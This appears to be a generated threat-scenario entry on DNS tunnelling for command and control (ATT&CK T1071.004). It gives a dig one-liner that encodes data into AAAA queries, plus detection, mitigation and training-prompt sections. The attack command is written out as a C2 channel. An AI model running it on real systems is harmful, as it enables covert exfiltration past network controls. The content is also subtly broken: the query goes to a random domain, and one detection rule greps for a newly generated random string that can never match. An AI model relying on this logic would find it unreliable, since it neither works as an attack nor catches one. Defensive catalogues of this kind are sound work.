---
type: campaign
scenario_id: 361
tactic: Command and Control
technique: "T1071.004: Application Layer Protocol: DNS"
technique_id: T1071.004
tags: [campaign, lotl, command_and_control]
---

# Using dig for DNS tunneling with AAAA records for C2.

## Threat Description
Using dig for DNS tunneling with AAAA records for C2.

## Attack Command
```
dig +short AAAA $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(echo c2cmd | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)
```

## Detection Logic
Monitor dig AAAA queries: `tcpdump -i any port 53 | grep AAAA`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.

## Mitigation
Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.

## AI Training Prompt
Train AI to detect dig-based DNS tunneling with AAAA records by analyzing query patterns, base64-encoded subdomains, and DNS traffic spikes; recommend DNS inspection.

## References
- MITRE ATT&CK T1071.004: https://attack.mitre.org/techniques/T1071/004/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
